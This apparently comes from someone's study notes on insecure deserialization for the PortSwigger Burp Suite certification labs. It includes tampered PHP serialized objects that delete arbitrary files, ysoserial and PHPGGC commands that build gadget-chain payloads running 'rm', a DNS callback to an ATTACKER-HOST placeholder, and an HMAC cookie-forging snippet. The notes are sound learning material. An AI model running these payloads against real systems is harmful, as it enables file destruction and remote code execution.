##### PortSwigger BurpSuite Certification Summary
# Deserialization Attacks
If an introduction is necessary, check here:
https://portswigger.net/web-security/deserialization

## Recognising Serialized Data
### PHP
PHP uses strings which are easily recognisable:
```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```
	O:4        = Object with 4-character name
	"User":2   = Object name with two attributes
	s:4        = String with 4 characters

The functions `serialize()` and `unserialize()` are used.

### Java
Java uses a binary form. One way to recognize it is the starting bytes of the object:
```
ac ed            for hex
rO0              for Base64
```
The function `readObject()` is used to deserialize data from an `InputStream`. Every object implementing `java.io.Serializable` can be used.

## Abusing weird PHP Syntax
The `==` operator tries to compare things even if they have a different data type. If possible, a number in a string will be converted to an integer if it's compared to one. If this is not possible, the string will be converted to a 0. Some examples:
```
5 == "5"         true
5 == "5 abcd"    true
0 == "abcd"      true
```
Let's consider this function:
```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```
If `$login['password']` is altered by the attacker to become the integer zero, the if statement returns true as long as there are no numbers in the stored `$password`.

## Abusing Application Logic
Sometimes actions are performed based on values coming from serialized object. As an example, a link to the profile picture might be stored with the cookie and the picture deleted when the account is removed. Altering the file path would then remove any arbitrary file:
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zuqphb2t5hlncofsiyh575caktne0q7p";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```
becomes
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zuqphb2t5hlncofsiyh575caktne0q7p";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
## Magic Methods
Those methods are invoked automatically when some corresponding event hapens. One example is Python's `__init__` method. Similarly, they exist manyfold in other languages, such as the `__construct()` method in PHP.
Some methods are called during the serialization, like PHP's `__wakeup()` function. The same goes for Java's `readObject()`. This method can also be customized:
```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```
Example:
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
This code uses the `__destruct()` method which removes the file at `lock_file_path`, a user controllable variable. The serialized object that removes a user's arbitrary file thus looks like this:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

## Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. 

### Pre-built Gadget Chains
For known frameworks the gadget chain can be already known without acces to the source code. Such chains are accessible pre-built and can be tried out with relatively low effort.
#### ysoserial
This chain is used for Java and offers multiple functionalities, not all connected to RCE. In order to check if a deserialization attack is possible, a DNS request can be made with a functionality that works in any case (except no deserialization attack is possible of course). The chain is called `URLDNS`.
Another way of checking is to establish a tcp connection with `JRMPClient`. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.

A payload can be created in the following way:
```
java -jar ysoserial-xxx.jar URLDNS 'ATTACKER-HOST' | base64 | tr --d '\n'

java -jar ysoserial-xxx.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr --d '\n'
```
#### PHPGGC
This library provides pre-built chains for PHP:
```
./phpgcc -l
./phpgcc -i CakePHP/RCE1
./phpgcc Symfony/RCE3 'rm /home/carlos/morale.txt' | base64 | tr --d '\n'
```

In one lab, the token is checked against an HMAC which is created with a secret. After obtaining the secret, the correct cookie with the payload can be created the following way:
```
<?php
$object = "PAYLOAD";
$secret = "SECRET";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1',$object,$secret) . '"}');
echo $cookie;
```
Where the cookie parameters are adapted to the one in use in the original one.
